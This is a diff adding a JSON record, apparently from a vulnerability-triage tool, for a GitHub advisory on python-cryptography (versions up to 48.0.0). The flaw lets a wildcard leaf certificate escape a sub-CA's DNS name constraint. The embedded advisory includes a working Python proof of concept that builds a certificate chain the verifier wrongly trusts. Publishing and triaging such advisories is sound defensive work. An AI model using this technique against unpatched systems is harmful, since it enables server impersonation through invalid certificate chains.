@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/469092?v=4\", \"events_url\": \"https://api.github.com/users/randombit/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/randombit/followers\", \"following_url\": \"https://api.github.com/users/randombit/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/randombit/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/randombit\", \"id\": 469092, \"login\": \"randombit\", \"node_id\": \"MDQ6VXNlcjQ2OTA5Mg==\", \"organizations_url\": \"https://api.github.com/users/randombit/orgs\", \"received_events_url\": \"https://api.github.com/users/randombit/received_events\", \"repos_url\": \"https://api.github.com/users/randombit/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/randombit/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/randombit/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/randombit\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/3059210?v=4\", \"events_url\": \"https://api.github.com/users/woodruffw/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/woodruffw/followers\", \"following_url\": \"https://api.github.com/users/woodruffw/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/woodruffw/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/woodruffw\", \"id\": 3059210, \"login\": \"woodruffw\", \"node_id\": \"MDQ6VXNlcjMwNTkyMTA=\", \"organizations_url\": \"https://api.github.com/users/woodruffw/orgs\", \"received_events_url\": \"https://api.github.com/users/woodruffw/received_events\", \"repos_url\": \"https://api.github.com/users/woodruffw/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/woodruffw/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/woodruffw/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/woodruffw\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-69248\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 6.9, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:P\"}}, \"cwes\": [{\"cwe_id\": \"CWE-295\", \"name\": \"Improper Certificate Validation\"}], \"description\": \"### Summary\\nIf an intermediate constrained CA permits the DNS name `foo.example.com`, and the leaf certificate has a wildcard in its DNS SAN of `*.example.com`, python-cryptography's verifier accepts which allows escaping outside of the permitted names.\\n\\n### PoC\\n\\n```\\n#!/usr/bin/env python3\\n\\\"\\\"\\\"Standalone PoC: pyca's DNSConstraint::matches admits a too-broad wildcard SAN.\\n\\nSetup:\\n  Sub-CA permitted constraint: dNSName = foo.example.com\\n  Leaf SAN:                    dNSName = *.example.com\\nExpected: rejection (RFC 5280 §4.2.1.10 + standard wildcard semantics).\\nObserved: pyca accepts; further, asks server-verifier whether the leaf is\\nauthoritative for `bar.example.com` and pyca answers yes — a sub-CA scope\\nescape.\\n\\\"\\\"\\\"\\nimport datetime\\nfrom cryptography import x509\\nfrom cryptography.x509.oid import NameOID\\nfrom cryptography.hazmat.primitives import hashes\\nfrom cryptography.hazmat.primitives.asymmetric import ec\\nfrom cryptography.x509.verification import (\\n    PolicyBuilder, Store, ExtensionPolicy, Criticality, VerificationError,\\n)\\n\\nnow = datetime.datetime(2027, 1, 1, tzinfo=datetime.timezone.utc)\\nday = datetime.timedelta(days=1)\\n\\ndef build(subject, issuer, key, issuer_key, ca, exts=()):\\n    b = (x509.CertificateBuilder()\\n         .subject_name(subject).issuer_name(issuer)\\n         .public_key(key.public_key())\\n         .serial_number(x509.random_serial_number())\\n         .not_valid_before(now - 30 * day)\\n         .not_valid_after(now + 3650 * day)\\n         .add_extension(x509.BasicConstraints(ca=ca, path_length=None), critical=True))\\n    for e, c in exts:\\n        b = b.add_extension(e, c)\\n    return b.sign(issuer_key, hashes.SHA256())\\n\\n# Root\\nrk = ec.generate_private_key(ec.SECP256R1())\\nrn = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \\\"Test Root\\\")])\\nroot = build(rn, rn, rk, rk, True)\\n\\n# Sub-CA constrained to foo.example.com\\nsk = ec.generate_private_key(ec.SECP256R1())\\nsn = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \\\"Sub-CA\\\")])\\nnc = x509.NameConstraints(\\n    permitted_subtrees=[x509.DNSName(\\\"foo.example.com\\\")],\\n    excluded_subtrees=None,\\n)\\nsub = build(sn, rn, sk, rk, True, [(nc, True)])\\n\\n# Leaf with SAN *.example.com (over-broad relative to the constraint)\\nlk = ec.generate_private_key(ec.SECP256R1())\\nln = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, \\\"Leaf\\\")])\\nsan = x509.SubjectAlternativeName([x509.DNSName(\\\"*.example.com\\\")])\\nleaf = build(ln, sn, lk, sk, False, [(san, False)])\\n\\n# Policies\\nca_pol = ExtensionPolicy.permit_all().require_present(\\n    x509.BasicConstraints, Criticality.AGNOSTIC, None,\\n)\\nee_pol = ExtensionPolicy.permit_all().require_present(\\n    x509.SubjectAlternativeName, Criticality.AGNOSTIC, None,\\n)\\nv = (\\n    PolicyBuilder()\\n    .store(Store([root]))\\n    .time(now)\\n    .extension_policies(ca_policy=ca_pol, ee_policy=ee_pol)\\n    .build_server_verifier(x509.DNSName(\\\"bar.example.com\\\"))\\n)\\ntry:\\n    v.verify(leaf, [sub])\\n    print(\\\"BUG: pyca trusted leaf as bar.example.com though sub-CA was constrained to foo.example.com\\\")\\nexcept VerificationError as e:\\n    print(f\\\"EXPECTED: VerificationError: {e}\\\")\\n```\\n\\n### Impact\\n\\nAcceptance of invalid certificate chain.\", \"ghsa_id\": \"GHSA-m2h6-j472-rp4c\", \"github_reviewed_at\": \"2026-08-03T21:26:57Z\", \"html_url\": \"https://github.com/advisories/GHSA-m2h6-j472-rp4c\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-m2h6-j472-rp4c\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-69248\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-03T21:26:57Z\", \"references\": [\"https://github.com/pyca/cryptography/security/advisories/GHSA-m2h6-j472-rp4c\", \"https://github.com/pyca/cryptography/pull/14888\", \"https://github.com/pyca/cryptography/commit/4d035a4225965edeffd312079a510ef25fcfdcb2\", \"https://github.com/advisories/GHSA-m2h6-j472-rp4c\"], \"repository_advisory_url\": \"https://api.github.com/repos/pyca/cryptography/security-advisories/GHSA-m2h6-j472-rp4c\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/pyca/cryptography\", \"summary\": \"python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-03T21:26:59Z\", \"url\": \"https://api.github.com/advisories/GHSA-m2h6-j472-rp4c\", \"vulnerabilities\": [{\"first_patched_version\": \"49.0.0\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"cryptography\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 48.0.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-m2h6-j472-rp4c",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "cryptography: <= 48.0.0"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-69248"
+    ],
+    "cvss_score": 6.9,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "cryptography"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-08-04T19:37:52.775270Z",
+  "provenance": {
+    "content_sha256": "829d6b5c7d85696988fabc740104295b6a0c29929cf3b0b8196c152ff2509892",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-03T21:26:57Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-m2h6-j472-rp4c",
+  "status": "active",
+  "title": "python-cryptography verifier accepts wildcard DNS names allowing escape from permittedSubtrees",
+  "updated_at": "2026-08-03T21:26:59Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-m2h6-j472-rp4c"
+}
